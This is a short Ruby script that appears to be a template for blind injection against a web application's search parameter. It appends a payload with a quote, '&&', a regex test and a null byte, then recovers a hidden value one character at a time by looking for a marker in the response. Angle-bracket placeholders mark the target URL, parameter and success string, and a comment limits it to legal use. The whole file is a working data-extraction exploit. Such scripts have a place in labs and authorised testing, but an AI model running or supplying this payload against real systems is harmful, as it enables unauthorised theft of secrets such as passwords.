#!/usr/bin/ruby
require 'httparty'
#the areas that are annotated with <something> require changing
#this is my own code and should only be used in LEGAL applications

URL="<targetUrl>"
def check?(str)
  resp = HTTParty.get("http://#{URL}/?search=<param>' %26%26 <regex you wish to check>(/#{str}/)%00")
  return resp.body =~ <enter the value that only appears when true>  #example />admin</
end

#puts check?("d").inspect   #remove the hashtag to run this as a test to verify script is running
#puts check?("aaa").inspect

CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-'] #you can alter the charset to fit your needs, for example. ('A'..'Z') for uppercase
trueValues = "" #holds the values that return true

while true
  CHARSET.each do |c|
    puts "Trying: #{c} for #{trueValues}"
    test = trueValues+c
    if check?("^#{test}.*$")
      trueValues+=c #this concatenates a value from the charset to any values that returned true
      puts trueValues
      break
    end
  end
end  
